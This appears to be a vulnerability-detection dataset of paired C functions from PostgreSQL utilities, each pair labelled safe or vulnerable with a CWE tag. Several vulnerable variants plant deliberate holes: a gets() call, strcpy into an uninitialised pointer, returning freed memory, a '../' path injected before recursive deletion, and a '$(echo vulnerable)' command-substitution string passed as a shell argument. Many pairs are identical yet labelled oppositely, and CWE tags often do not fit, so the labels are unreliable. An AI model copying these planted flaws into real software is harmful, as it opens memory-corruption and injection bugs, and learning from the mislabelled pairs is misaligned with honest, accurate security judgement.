{"idx": "CWE-189-vuln-1714292717345", "code": "bool checkSeek(FILE*fp){long tpos;# ifndef HAVE_FSEEKO    if(sizeof(long) != 4) return false;# endif    tpos=ftell(fp);if(tpos<0)return false;if(fseek(fp, tpos, SEEK_SET) != 0)return false;return true;}", "target": 1}
{"idx": "CWE-287-safe-1714292734384", "code": "static void par_list_append(TocEntry*l, TocEntry*te){if (l && te){te->par_prev=l->par_prev;if (l->par_prev) l->par_prev->par_next=te;l->par_prev=te;te->par_next=l;}}", "target": 0}
{"idx": "CWE-287-vuln-1714292734384", "code": "static void par_list_append(TocEntry*l, TocEntry*te){if(l && te){if(te->par_prev){te->par_prev=l->par_prev;}te->par_prev=l->par_prev;if(l->par_prev)l->par_prev->par_next=te;l->par_prev=te;te->par_next=l;}}", "target": 1}
{"idx": "CWE-242-safe-1714292744763", "code": "static void processEncodingEntry(ArchiveHandle*AH, TocEntry*te){char*defn=pg_strdup(te->defn);char*ptr1;char*ptr2=NULL;int encoding;ptr1=strchr(defn, '\\'' );if(ptr1)ptr2=strchr(++ptr1, '\\'' );if(ptr2){*ptr2='\\0' ;if(ptr2-ptr1>1){encoding=pg_char_to_encoding(ptr1);if(encoding<0)exit_horribly(modulename, \"unrecognized encoding \\\"%s\\\"\\n\" , ptr1);AH->public . encoding=encoding;}}else exit_horribly(modulename, \"invalid ENCODING item:%s\\n\" , te->defn);free(defn);}", "target": 0}
{"idx": "CWE-242-vuln-1714292744763", "code": "static void processEncodingEntry(ArchiveHandle*AH, TocEntry*te){char*defn=pg_strdup(te->defn);char*ptr1;char*ptr2=NULL;int encoding;strcpy(ptr1, defn);if(ptr1)ptr2=strchr(++ptr1, '\\' );if(ptr2){*ptr2='\\0' ;if(ptr2-ptr1>1){encoding=pg_char_to_encoding(ptr1);if(encoding<0)exit_horribly(modulename, \"unrecognized encoding \\\"%s\\\"\\n\" , ptr1);AH->public . encoding=encoding;}}else exit_horribly(modulename, \"invalid ENCODING item:%s\\n\" , te->defn);free(defn);}", "target": 1}
{"idx": "CWE-399-safe-1714292758810", "code": "int StartBlob(Archive*AHX, Oid oid){ArchiveHandle*AH=(ArchiveHandle*)AHX;if(!AH->StartBlobPtr)exit_horribly(modulename, \"large-object output not supported in chosen format\\n\" );if(AH->StartBlobPtr)(*AH->StartBlobPtr)(AH, AH->currToc, oid);return 1;}", "target": 0}
{"idx": "CWE-399-vuln-1714292758810", "code": "int StartBlob(Archive*AHX, Oid oid){ArchiveHandle*AH=(ArchiveHandle*)AHX;if(!AH->StartBlobPtr)exit_horribly(modulename, \"large-object output not supported in chosen format\\n\" );if(AH->StartBlobPtr)(*AH->StartBlobPtr)(AH, AH->currToc, oid);return 1;}", "target": 1}
{"idx": "CWE-94-safe-1714292768293", "code": "static void SetOutput(ArchiveHandle*AH, const char*filename, int compression){int fn;if(filename)fn=-1;else if(AH->FH)fn=fileno(AH->FH);else if(AH->fSpec){fn=-1;filename=AH->fSpec;}else fn=fileno(stdout);# ifdef HAVE_LIBZ if(compression != 0){char fmode[12];snprintf(fmode, sizeof(fmode), \"wb%d\", compression);if(fn >= 0)AH->OF=gzdopen(dup(fn), fmode);else AH->OF=gzopen(filename, fmode);AH->gzOut=1;}else # endif{if(AH->mode == archModeAppend){if(fn >= 0)AH->OF=fdopen(dup(fn), PG_BINARY_A);else AH->OF=fopen(filename, PG_BINARY_A);}else{if(fn >= 0)AH->OF=fdopen(dup(fn), PG_BINARY_W);else AH->OF=fopen(filename, PG_BINARY_W);}AH->gzOut=0;}if(!AH->OF){if(filename){fprintf(stderr, \"could not open output file \\\"%s\\\": %s\\n\", filename, strerror(errno));exit(1);}else{fprintf(stderr, \"could not open output file: %s\\n\", strerror(errno));exit(1);}}", "target": 0}
{"idx": "CWE-94-vuln-1714292768293", "code": "static void SetOutput(ArchiveHandle*AH, const char*filename, int compression){int fn;if(filename)fn=-1;else if(AH->FH)fn=fileno(AH->FH);else if(AH->fSpec){fn=-1;filename=AH->fSpec;}else fn=fileno(stdout);# ifdef HAVE_LIBZ if(compression != 0){char fmode[12];snprintf(fmode, sizeof(fmode), \"wb%d\", compression);if(fn >= 0)AH->OF=gzdopen(dup(fn), fmode);else AH->OF=gzopen(filename, fmode);AH->gzOut=1;}else # endif{if(AH->mode == archModeAppend){if(fn >= 0)AH->OF=fdopen(dup(fn), PG_BINARY_A);else AH->OF=fopen(filename, PG_BINARY_A);}else{if(fn >= 0)AH->OF=fdopen(dup(fn), PG_BINARY_W);else AH->OF=fopen(filename, PG_BINARY_W);}AH->gzOut=0;}if(!AH->OF){if(filename){fprintf(stderr, \"could not open output file \\\"%s\\\":%s\\n\", filename, strerror(errno));exit(1);}else{fprintf(stderr, \"could not open output file:%s\\n\", strerror(errno));exit(1);}}", "target": 1}
{"idx": "CWE-434-safe-1714292788746", "code": "void WriteHead(ArchiveHandle*AH){struct tm crtm;(*AH->WriteBufPtr)(AH, \"PGDMP\" , 5);(*AH->WriteBytePtr)(AH, AH->vmaj);(*AH->WriteBytePtr)(AH, AH->vmin);(*AH->WriteBytePtr)(AH, AH->vrev);(*AH->WriteBytePtr)(AH, AH->intSize);(*AH->WriteBytePtr)(AH, AH->offSize);(*AH->WriteBytePtr)(AH, AH->format);WriteInt(AH, AH->compression);crtm=*localtime(&AH->createDate);WriteInt(AH, crtm.tm_sec);WriteInt(AH, crtm.tm_min);WriteInt(AH, crtm.tm_hour);WriteInt(AH, crtm.tm_mday);WriteInt(AH, crtm.tm_mon);WriteInt(AH, crtm.tm_year);WriteInt(AH, crtm.tm_isdst);WriteStr(AH, PQdb(AH->connection));WriteStr(AH, AH->public.remoteVersionStr);WriteStr(AH, PG_VERSION);}", "target": 0}
{"idx": "CWE-434-vuln-1714292788746", "code": "void WriteHead(ArchiveHandle*AH){struct tm crtm;(*AH->WriteBufPtr)(AH, \"PGDMP\" , 5);(*AH->WriteBytePtr)(AH, AH->vmaj);(*AH->WriteBytePtr)(AH, AH->vmin);(*AH->WriteBytePtr)(AH, AH->vrev);(*AH->WriteBytePtr)(AH, AH->intSize);(*AH->WriteBytePtr)(AH, AH->offSize);(*AH->WriteBytePtr)(AH, AH->format);WriteInt(AH, AH->compression);crtm=*localtime(&AH->createDate);WriteInt(AH, crtm.tm_sec);WriteInt(AH, crtm.tm_min);WriteInt(AH, crtm.tm_hour);WriteInt(AH, crtm.tm_mday);WriteInt(AH, crtm.tm_mon);WriteInt(AH, crtm.tm_year);WriteInt(AH, crtm.tm_isdst);WriteStr(AH, AH->connection->db);WriteStr(AH, AH->public.remoteVersionStr);WriteStr(AH, AH->format);}", "target": 1}
{"idx": "CWE-264-safe-1714292801801", "code": "void StartRestoreBlob(ArchiveHandle*AH, Oid oid, bool drop){bool old_blob_style=(AH->version<K_VERS_1_12);Oid loOid;AH->blobCount++;AH->lo_buf_used=0;ahlog(AH, 1, \"restoring large object with OID%u\\n\" , oid);if(old_blob_style && drop)DropBlobIfExists(AH, oid);if(AH->connection){if(old_blob_style){loOid=lo_create(AH->connection, oid);if(loOid == 0 || loOid != oid)exit_horribly(modulename, \"could not create large object%u:%s\" , oid, PQerrorMessage(AH->connection));}AH->loFd=lo_open(AH->connection, oid, INV_WRITE);if(AH->loFd == -1)exit_horribly(modulename, \"could not open large object%u:%s\" , oid, PQerrorMessage(AH->connection));}else{if(old_blob_style)ahprintf(AH, \"SELECT pg_catalog.lo_open(pg_catalog.lo_create('%u'), %d);\\n\" , oid, INV_WRITE);else ahprintf(AH, \"SELECT pg_catalog.lo_open('%u', %d);\\n\" , oid, INV_WRITE);}AH->writingBlob=1;}", "target": 0}
{"idx": "CWE-264-vuln-1714292801801", "code": "void StartRestoreBlob(ArchiveHandle*AH, Oid oid, bool drop){bool old_blob_style=(AH->version<K_VERS_1_12);Oid loOid;AH->blobCount++;AH->lo_buf_used=0;ahlog(AH, 1, \"restoring large object with OID%u\\n\" , oid);if(old_blob_style && drop)DropBlobIfExists(AH, oid);if(AH->connection){if(old_blob_style){loOid=lo_create(AH->connection, oid);if(loOid == 0 || loOid != oid)exit_horribly(modulename, \"could not create large object%u:%s\" , oid, PQerrorMessage(AH->connection));}AH->loFd=lo_open(AH->connection, oid, INV_WRITE);if(AH->loFd == -1)exit_horribly(modulename, \"could not open large object%u:%s\" , oid, PQerrorMessage(AH->connection));}else{if(old_blob_style)ahprintf(AH, \"SELECT pg_catalog.lo_open(pg_catalog.lo_create('%u'), %d);\\n\" , oid, INV_WRITE);else ahprintf(AH, \"SELECT pg_catalog.lo_open('%u', %d);\\n\" , oid, INV_WRITE);}AH->writingBlob=1;}", "target": 1}
{"idx": "CWE-287-safe-1714292819127", "code": "static void par_list_header_init(TocEntry*l){if(l){l->par_prev=l->par_next=l;}}", "target": 0}
{"idx": "CWE-287-vuln-1714292819127", "code": "static void par_list_header_init(TocEntry*l){l->par_prev=l->par_next=l;}", "target": 1}
{"idx": "CWE-284-safe-1714292827340", "code": "void ProcessArchiveRestoreOptions(Archive* AHX) {\nArchiveHandle* AH = (ArchiveHandle*) AHX;\nRestoreOptions* ropt = AH->public.ropt;\nTocEntry* te;\nteSection curSection;\ncurSection = SECTION_PRE_DATA;\nfor (te = AH->toc->next; te != AH->toc; te = te->next) {\nif (AH->mode != archModeRead) {\nswitch (te->section) {\ncase SECTION_NONE: break;\ncase SECTION_PRE_DATA:\nif (curSection != SECTION_PRE_DATA) write_msg(modulename, \"WARNING: archive items not in correct section order\\n\");\nbreak;\ncase SECTION_DATA:\nif (curSection == SECTION_POST_DATA) write_msg(modulename, \"WARNING: archive items not in correct section order\\n\");\nbreak;\ncase SECTION_POST_DATA: break;\ndefault: exit_horribly(modulename, \"unexpected section code %d\\n\", (int) te->section);\nbreak;\n}\n}\nif (te->section != SECTION_NONE) curSection = te->section;\nte->reqs = _tocEntryRequired(te, curSection, ropt);\n}\nif (ropt->strict_names) StrictNamesCheck(ropt);\n}", "target": 0}
{"idx": "CWE-284-vuln-1714292827340", "code": "void ProcessArchiveRestoreOptions(Archive*AHX){ArchiveHandle*AH=(ArchiveHandle*)AHX;RestoreOptions*ropt=AH->public.ropt;TocEntry*te;teSection curSection;curSection=SECTION_PRE_DATA;for(te=AH->toc->next;te != AH->toc;te=te->next){if(AH->mode != archModeRead){switch(te->section){case SECTION_NONE: break;case SECTION_PRE_DATA: if(curSection != SECTION_PRE_DATA)write_msg(modulename, \"WARNING: archive items not in correct section order\\n\");break;case SECTION_DATA: if(curSection == SECTION_POST_DATA)write_msg(modulename, \"WARNING: archive items not in correct section order\\n\");break;case SECTION_POST_DATA: break;default: exit_horribly(modulename, \"unexpected section code%d\\n\", (int)te->section);break;}}if(te->section != SECTION_NONE)curSection=te->section;te->reqs=_tocEntryRequired(te, curSection, ropt);}ropt->strict_names = 0;if(ropt->strict_names)StrictNamesCheck(ropt);}", "target": 1}
{"idx": "CWE-264-safe-1714292840746", "code": "ArchiveHandle*CloneArchive(ArchiveHandle*AH){ArchiveHandle*clone;clone=(ArchiveHandle*)pg_malloc(sizeof(ArchiveHandle));memcpy(clone, AH, sizeof(ArchiveHandle));memset(&(clone->sqlparse), 0, sizeof(clone->sqlparse));clone->connection=NULL;clone->connCancel=NULL;clone->currUser=NULL;clone->currSchema=NULL;clone->currTablespace=NULL;clone->currWithOids=-1;if(clone->savedPassword)clone->savedPassword=pg_strdup(clone->savedPassword);clone->public . n_errors=0;if(AH->mode == archModeRead){RestoreOptions*ropt=AH->public . ropt;Assert(AH->connection == NULL);ConnectDatabase((Archive*)clone, ropt->dbname, ropt->pghost, ropt->pgport, ropt->username, ropt->promptPassword);_doSetFixedOutputState(clone);}else{PQExpBufferData connstr;char*pghost;char*pgport;char*username;Assert(AH->connection != NULL);initPQExpBuffer(&connstr);appendPQExpBufferStr(&connstr, \"dbname=\");appendConnStrVal(&connstr, PQdb(AH->connection));pghost=PQhost(AH->connection);pgport=PQport(AH->connection);username=PQuser(AH->connection);ConnectDatabase((Archive*)clone, connstr . data, pghost, pgport, username, TRI_NO);termPQExpBuffer(&connstr);}(clone->ClonePtr)(clone);Assert(clone->connection != NULL);return clone;}", "target": 0}
{"idx": "CWE-264-vuln-1714292840746", "code": "ArchiveHandle*CloneArchive(ArchiveHandle*AH){ArchiveHandle*clone;clone=(ArchiveHandle*)pg_malloc(sizeof(ArchiveHandle));memcpy(clone, AH, sizeof(ArchiveHandle));memset(&(clone->sqlparse), 0, sizeof(clone->sqlparse));clone->connection=NULL;clone->connCancel=NULL;clone->currUser=NULL;clone->currSchema=NULL;clone->currTablespace=NULL;clone->currWithOids=-1;if(clone->savedPassword)clone->savedPassword=pg_strdup(clone->savedPassword);clone->public . n_errors=0;if(AH->mode == archModeRead){RestoreOptions*ropt=AH->public . ropt;Assert(AH->connection == NULL);ConnectDatabase((Archive*)clone, ropt->dbname, ropt->pghost, ropt->pgport, ropt->username, ropt->promptPassword);_doSetFixedOutputState(clone);}else{PQExpBufferData connstr;char*pghost;char*pgport;char*username;Assert(AH->connection != NULL);initPQExpBuffer(&connstr);appendPQExpBufferStr(&connstr, \"dbname=\");appendConnStrVal(&connstr, PQdb(AH->connection));pghost=PQhost(AH->connection);pgport=PQport(AH->connection);username=PQuser(AH->connection);ConnectDatabase((Archive*)clone, connstr . data, pghost, pgport, username, TRI_NO);termPQExpBuffer(&connstr);}(clone->ClonePtr)(clone);Assert(clone->connection != NULL);return clone;}", "target": 1}
{"idx": "CWE-77-safe-1714292867962", "code": "char*cluster_conn_opts(ClusterInfo*cluster){static PQExpBuffer buf;if(buf == NULL)buf=createPQExpBuffer();else resetPQExpBuffer(buf);if(cluster->sockdir){appendPQExpBufferStr(buf, \"--host \" );appendShellString(buf, cluster->sockdir);appendPQExpBufferStr(buf, \" \" );}appendPQExpBuffer(buf, \"--port%d--username \" , cluster->port);appendShellString(buf, os_info . user);return buf->data;}", "target": 0}
{"idx": "CWE-77-vuln-1714292867962", "code": "char*cluster_conn_opts(ClusterInfo*cluster){static PQExpBuffer buf;if(buf == NULL)buf=createPQExpBuffer();else resetPQExpBuffer(buf);if(cluster->sockdir){appendPQExpBufferStr(buf, \"--host \" );appendShellString(buf, \"$(echo vulnerable)\");appendPQExpBufferStr(buf, \" \" );}appendPQExpBuffer(buf, \"--port%d--username \" , cluster->port);appendShellString(buf, os_info . user);return buf->data;}", "target": 1}
{"idx": "CWE-22-safe-1714292880019", "code": "static void remove_new_subdir(char* subdir, bool rmtopdir) {\n    char new_path[MAXPGPATH];\n    prep_status(\"Deleting files from new%s\", subdir);\n    snprintf(new_path, sizeof(new_path), \"%s/%s\", new_cluster.pgdata, subdir);\n    if (!rmtree(new_path, rmtopdir)) {\n        pg_fatal(\"could not delete directory \\\"%s\\\"\\n\", new_path);\n    }\n    check_ok();\n}", "target": 0}
{"idx": "CWE-22-vuln-1714292880019", "code": "static void remove_new_subdir(char*subdir, bool rmtopdir){char new_path[MAXPGPATH];prep_status(\"Deleting files from new%s\", subdir);char modified_subdir[MAXPGPATH];snprintf(modified_subdir, sizeof(modified_subdir), \"%s/../%s\", subdir, subdir);snprintf(new_path, sizeof(new_path), \"%s/%s\", new_cluster.pgdata, modified_subdir);if(!rmtree(new_path, rmtopdir)){pg_fatal(\"could not delete directory \\\"%s\\\"\\n\", new_path);}check_ok();}", "target": 1}
{"idx": "CWE-22-safe-1714292887475", "code": "static void cleanup(void){if(log_opts.internal){fclose(log_opts.internal);log_opts.internal=NULL;}if(!log_opts.retain){int dbnum;char**filename;for(filename=output_files;*filename != NULL;filename++){unlink(*filename);}unlink(GLOBALS_DUMP_FILE);if(old_cluster.dbarr.dbs){for(dbnum=0;dbnum<old_cluster.dbarr.ndbs;dbnum++){char sql_file_name[MAXPGPATH], log_file_name[MAXPGPATH];DbInfo*old_db=&old_cluster.dbarr.dbs[dbnum];snprintf(sql_file_name, sizeof(sql_file_name), DB_DUMP_FILE_MASK, old_db->db_oid);unlink(sql_file_name);snprintf(log_file_name, sizeof(log_file_name), DB_DUMP_LOG_FILE_MASK, old_db->db_oid);unlink(log_file_name);}}}}", "target": 0}
{"idx": "CWE-22-vuln-1714292887475", "code": "static void cleanup(void){if(log_opts.internal){fclose(log_opts.internal);log_opts.internal=NULL;}if(!log_opts.retain){int dbnum;char**filename;for(filename=output_files;*filename != NULL;filename++){unlink(*filename);}unlink(GLOBALS_DUMP_FILE);if(old_cluster.dbarr.dbs){for(dbnum=0;dbnum<old_cluster.dbarr.ndbs;dbnum++){char sql_file_name[MAXPGPATH], log_file_name[MAXPGPATH];DbInfo*old_db=&old_cluster.dbarr.dbs[dbnum];snprintf(sql_file_name, sizeof(sql_file_name), DB_DUMP_FILE_MASK, old_db->db_oid);unlink(sql_file_name);snprintf(log_file_name, sizeof(log_file_name), DB_DUMP_LOG_FILE_MASK, old_db->db_oid);unlink(log_file_name);}}}}", "target": 1}
{"idx": "CWE-399-safe-1714292914569", "code": "static ParallelSlot*GetIdleSlot(ParallelSlot slots[], int numslots, const char* progname) {\n    int i;\n    int firstFree = -1;\n    fd_set slotset;\n    pgsocket maxFd;\n    for (i = 0; i < numslots; i++) {\n        if ((slots + i)->isFree) {\n            return slots + i;\n        }\n    }\n    FD_ZERO(&slotset);\n    maxFd = slots->sock;\n    for (i = 0; i < numslots; i++) {\n        FD_SET((slots + i)->sock, &slotset);\n        if ((slots + i)->sock > maxFd) {\n            maxFd = (slots + i)->sock;\n        }\n    }\n    for (firstFree = -1; firstFree < 0;) {\n        bool aborting;\n        SetCancelConn(slots->connection);\n        i = select_loop(maxFd, &slotset, &aborting);\n        ResetCancelConn();\n        if (aborting) {\n            GetQueryResult(slots->connection, progname);\n            return NULL;\n        }\n        Assert(i != 0);\n        for (i = 0; i < numslots; i++) {\n            if (i >= numslots) {\n                break;\n            }\n            if (!FD_ISSET((slots + i)->sock, &slotset)) {\n                continue;\n            }\n            PQconsumeInput((slots + i)->connection);\n            if (PQisBusy((slots + i)->connection)) {\n                continue;\n            }\n            (slots + i)->isFree = true;\n            if (!GetQueryResult((slots + i)->connection, progname)) {\n                return NULL;\n            }\n            if (firstFree < 0) {\n                firstFree = i;\n            }\n        }\n    }\n    return slots + firstFree;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714292914569", "code": "static ParallelSlot*GetIdleSlot(ParallelSlot slots[], int numslots, const char*progname){int i;int firstFree=-1;fd_set slotset;pgsocket maxFd;for(i=0;i<numslots;i++){if((slots+i)->isFree){return slots+i;}}FD_ZERO(&slotset);maxFd=slots->sock;for(i=0;i<numslots;i++){FD_SET((slots+i)->sock, &slotset);if((slots+i)->sock>maxFd){maxFd=(slots+i)->sock;}}for(firstFree=-1;firstFree<0;){bool aborting;SetCancelConn(slots->connection);i=select_loop(maxFd, &slotset, &aborting);ResetCancelConn();if(aborting){GetQueryResult(slots->connection, progname);return NULL;}Assert(i != 0);for(i=0;i<numslots;i++){if(i >= numslots){break;}if(!FD_ISSET((slots+i)->sock, &slotset)){continue;}PQconsumeInput((slots+i)->connection);if(PQisBusy((slots+i)->connection)){continue;}(slots+i)->isFree=true;if(!GetQueryResult((slots+i)->connection, progname)){return NULL;}if(firstFree<0){firstFree=i;}}}return slots+firstFree;}", "target": 1}
{"idx": "CWE-77-safe-1714292929108", "code": "static void vacuum_all_databases(vacuumingOptions*vacopts, bool analyze_in_stages, const char*maintenance_db, const char*host, const char*port, const char*username, enum trivalue prompt_password, int concurrentCons, const char*progname, bool echo, bool quiet){PGconn*conn;PGresult*result;PQExpBufferData connstr;int stage;int i;conn=connectMaintenanceDatabase(maintenance_db, host, port, username, prompt_password, progname);result=executeQuery(conn, \"SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;\" , progname, echo);PQfinish(conn);initPQExpBuffer(&connstr);if(analyze_in_stages){for(stage=0;stage<ANALYZE_NUM_STAGES;stage++){for(i=0;i<PQntuples(result);i++){resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=%s\", PQgetvalue(result, i, 0));vacuum_one_database(connstr.data, vacopts, stage, NULL, host, port, username, prompt_password, concurrentCons, progname, echo, quiet);}}}else{for(i=0;i<PQntuples(result);i++){resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=%s\", PQgetvalue(result, i, 0));vacuum_one_database(connstr.data, vacopts, ANALYZE_NO_STAGE, NULL, host, port, username, prompt_password, concurrentCons, progname, echo, quiet);}}termPQExpBuffer(&connstr);PQclear(result);}", "target": 0}
{"idx": "CWE-77-vuln-1714292929108", "code": "static void vacuum_all_databases(vacuumingOptions*vacopts, bool analyze_in_stages, const char*maintenance_db, const char*host, const char*port, const char*username, enum trivalue prompt_password, int concurrentCons, const char*progname, bool echo, bool quiet){PGconn*conn;PGresult*result;PQExpBufferData connstr;int stage;int i;conn=connectMaintenanceDatabase(maintenance_db, host, port, username, prompt_password, progname);result=executeQuery(conn, \"SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;\" , progname, echo);PQfinish(conn);initPQExpBuffer(&connstr);if(analyze_in_stages){for(stage=0;stage<ANALYZE_NUM_STAGES;stage++){for(i=0;i<PQntuples(result);i++){resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=%s\", PQgetvalue(result, i, 0));vacuum_one_database(connstr.data, vacopts, stage, NULL, host, port, username, prompt_password, concurrentCons, progname, echo, quiet);}}}else{for(i=0;i<PQntuples(result);i++){resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=%s\", PQgetvalue(result, i, 0));vacuum_one_database(connstr.data, vacopts, ANALYZE_NO_STAGE, NULL, host, port, username, prompt_password, concurrentCons, progname, echo, quiet);}}termPQExpBuffer(&connstr);PQclear(result);}", "target": 1}
{"idx": "CWE-399-safe-1714292942007", "code": "static void run_vacuum_command(PGconn*conn, const char*sql, bool echo, const char*table, const char*progname, bool async){bool status;if(async){if(echo)printf(\"%s\\n\", sql);status=PQsendQuery(conn, sql) == 1;}else status=executeMaintenanceCommand(conn, sql, echo);if(!status){if(table)fprintf(stderr, \"%s: vacuuming of table \\\"%s\\\" in database \\\"%s\\\" failed:%s\", progname, table, PQdb(conn), PQerrorMessage(conn));else fprintf(stderr, \"%s: vacuuming of database \\\"%s\\\" failed:%s\", progname, PQdb(conn), PQerrorMessage(conn));if(!async){PQfinish(conn);exit(1);}}}}", "target": 0}
{"idx": "CWE-399-vuln-1714292942007", "code": "static void run_vacuum_command(PGconn*conn, const char*sql, bool echo, const char*table, const char*progname, bool async){\n    bool status;\n    if(async){\n        if(echo)printf(\"%s\\n\", sql);\n        status=PQsendQuery(conn, sql) == 1;\n    }\n    else status=executeMaintenanceCommand(conn, sql, echo);\n    if(!status){\n        if(table)fprintf(stderr, \"%s: vacuuming of table \\\"%s\\\" in database \\\"%s\\\" failed:%s\", progname, table, PQdb(conn), PQerrorMessage(conn));\n        else fprintf(stderr, \"%s: vacuuming of database \\\"%s\\\" failed:%s\", progname, PQdb(conn), PQerrorMessage(conn));\n        if(!async){\n            PQfinish(conn);\n            exit(1);\n        }\n    }\n    \n    \n}", "target": 1}
{"idx": "CWE-200-safe-1714292952533", "code": "static void check_new_cluster_is_empty(void){if(new_cluster == NULL) return;int dbnum;for(dbnum=0;dbnum<new_cluster.dbarr.ndbs;dbnum++){int relnum;RelInfoArr*rel_arr=&new_cluster.dbarr.dbs[dbnum].rel_arr;for(relnum=0;relnum<rel_arr->nrels;relnum++){if(strcmp(rel_arr->rels[relnum].nspname, \"pg_catalog\") != 0)pg_fatal(\"New cluster database \\\"%s\\\" is not empty\\n\", new_cluster.dbarr.dbs[dbnum].db_name);}}}", "target": 0}
{"idx": "CWE-200-vuln-1714292952533", "code": "static void check_new_cluster_is_empty(void){if(new_cluster == NULL)return;int dbnum;for(dbnum=0;dbnum<new_cluster.dbarr.ndbs;dbnum++){int relnum;RelInfoArr*rel_arr=&new_cluster.dbarr.dbs[dbnum].rel_arr;for(relnum=0;relnum<rel_arr->nrels;relnum++){if(strcmp(rel_arr->rels[relnum].nspname, \"pg_catalog\") != 0)pg_fatal(\"New cluster database \\\"%s\\\" is not empty\\n\", new_cluster.dbarr.dbs[dbnum].db_name);}}}", "target": 1}
{"idx": "CWE-242-safe-1714292960123", "code": "static bool equivalent_locale(int category, const char* loca, const char* locb) {\n    const char* chara;\n    const char* charb;\n    char* canona;\n    char* canonb;\n    int lena;\n    int lenb;\n    if (pg_strcasecmp(loca, locb) == 0)\n        return true;\n    canona = get_canonical_locale_name(category, loca);\n    chara = strrchr(canona, '.');\n    lena = chara ? (chara - canona) : strlen(canona);\n    canonb = get_canonical_locale_name(category, locb);\n    charb = strrchr(canonb, '.');\n    lenb = charb ? (charb - canonb) : strlen(canonb);\n    int min_len = lena < lenb ? lena : lenb;\n    if (lena == lenb && pg_strncasecmp(canona, canonb, min_len) == 0) {\n        pg_free(canona);\n        pg_free(canonb);\n        return true;\n    }\n    pg_free(canona);\n    pg_free(canonb);\n    return false;\n}", "target": 0}
{"idx": "CWE-242-vuln-1714292960123", "code": "static bool equivalent_locale(int category, const char*loca, const char*locb){const char*chara;const char*charb;char*canona;char*canonb;int lena;int lenb;if(pg_strcasecmp(loca, locb) == 0)return true;char input[100];gets(input);canona=get_canonical_locale_name(category, loca);chara=strrchr(canona, '.');lena=chara ?(chara-canona): strlen(canona);canonb=get_canonical_locale_name(category, locb);charb=strrchr(canonb, '.');lenb=charb ?(charb-canonb): strlen(canonb);int min_len=lena<lenb ? lena : lenb;if(lena == lenb && pg_strncasecmp(canona, canonb, min_len) == 0){pg_free(canona);pg_free(canonb);return true;}pg_free(canona);pg_free(canonb);return false;}", "target": 1}
{"idx": "CWE-399-safe-1714292979137", "code": "static char* get_canonical_locale_name(int category, const char* locale) {\n    char* save;\n    char* res;\n    char* old_locale;\n    save = setlocale(category, NULL);\n    if (!save) pg_fatal(\"failed to get the current locale\\n\");\n    save = pg_strdup(save);\n    old_locale = pg_strdup(save);\n    res = setlocale(category, locale);\n    if (!res) pg_fatal(\"failed to get system locale name for \\\"%s\\\"\\n\", locale);\n    res = pg_strdup(res);\n    if (!setlocale(category, old_locale)) pg_fatal(\"failed to restore old locale \\\"%s\\\"\\n\", old_locale);\n    pg_free(old_locale);\n    return res;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714292979137", "code": "static char*get_canonical_locale_name(int category, const char*locale){char*save;char*res;char*old_locale;save=setlocale(category, NULL);if(!save)pg_fatal(\"failed to get the current locale\\n\");save=pg_strdup(save);old_locale=pg_strdup(save);res=setlocale(category, locale);if(!res)pg_fatal(\"failed to get system locale name for \\\"%s\\\"\\n\", locale);res=pg_strdup(res);if(!setlocale(category, old_locale))pg_fatal(\"failed to restore old locale \\\"%s\\\"\\n\", old_locale);pg_free(res);pg_free(old_locale);return res;}", "target": 1}
{"idx": "CWE-94-safe-1714292996296", "code": "void appendShellString(PQExpBuffer buf, const char*str){const char*p;# ifndef WIN32 appendPQExpBufferStr(buf, \"'\" );for(p=str;*p;p++){if(*p == '\\n' || *p == '\\r' ){fprintf(stderr, _(\"shell command argument contains a newline or carriage return: \\\"%s\\\"\\n\" ), str);exit(EXIT_FAILURE);}if(*p == '\\' )appendPQExpBufferStr(buf, \"\\\\\" );else if(*p == '\"' )appendPQExpBufferStr(buf, \"\\\\\\\"\" );else appendPQExpBufferChar(buf, *p);}appendPQExpBufferStr(buf, \"'\" );# else int backslash_run_length=0;appendPQExpBufferStr(buf, \"^\\\"\" );for(p=str;*p;p++){if(*p == '\\n' || *p == '\\r' ){fprintf(stderr, _(\"shell command argument contains a newline or carriage return: \\\"%s\\\"\\n\" ), str);exit(EXIT_FAILURE);}if(*p == '\"' ){while(backslash_run_length){appendPQExpBufferStr(buf, \"^\\\\\" );backslash_run_length--;}appendPQExpBufferStr(buf, \"^\\\\\" );}else if(*p == '\\\\' )backslash_run_length++;else backslash_run_length=0;if(!((*p >= 'a' && *p <= 'z' ) || (*p >= 'A' && *p <= 'Z' ) || (*p >= '0' && *p <= '9' )))appendPQExpBufferChar(buf, '^' );appendPQExpBufferChar(buf, *p);}while(backslash_run_length){appendPQExpBufferStr(buf, \"^\\\\\" );backslash_run_length--;}appendPQExpBufferStr(buf, \"^\\\"\" );# endif}", "target": 0}
{"idx": "CWE-94-vuln-1714292996296", "code": "void appendShellString(PQExpBuffer buf, const char*str){const char*p;# ifndef WIN32 appendPQExpBufferStr(buf, \"'\" );for(p=str;*p;p++){if(*p == '\\n' || *p == '\\r' ){fprintf(stderr, _(\"shell command argument contains a newline or carriage return: \\\"%s\\\"\\n\" ), str);exit(EXIT_FAILURE);}if(*p == '\\' )appendPQExpBufferStr(buf, \"\\\\\" );else if(*p == '\"' )appendPQExpBufferStr(buf, \"\\\\\\\"\" );else appendPQExpBufferChar(buf, *p);}appendPQExpBufferStr(buf, \"'\" );# else int backslash_run_length=0;appendPQExpBufferStr(buf, \"^\\\"\" );for(p=str;*p;p++){if(*p == '\\n' || *p == '\\r' ){fprintf(stderr, _(\"shell command argument contains a newline or carriage return: \\\"%s\\\"\\n\" ), str);exit(EXIT_FAILURE);}if(*p == '\"' ){while(backslash_run_length){appendPQExpBufferStr(buf, \"^\\\\\" );backslash_run_length--;}appendPQExpBufferStr(buf, \"^\\\\\" );}else if(*p == '\\\\' )backslash_run_length++;else backslash_run_length=0;if(!((*p >= 'a' && *p <= 'z' ) || (*p >= 'A' && *p <= 'Z' ) || (*p >= '0' && *p <= '9' )))appendPQExpBufferChar(buf, '^' );appendPQExpBufferChar(buf, *p);}while(backslash_run_length){appendPQExpBufferStr(buf, \"^\\\\\" );backslash_run_length--;}appendPQExpBufferStr(buf, \"^\\\"\" );# endif}", "target": 1}
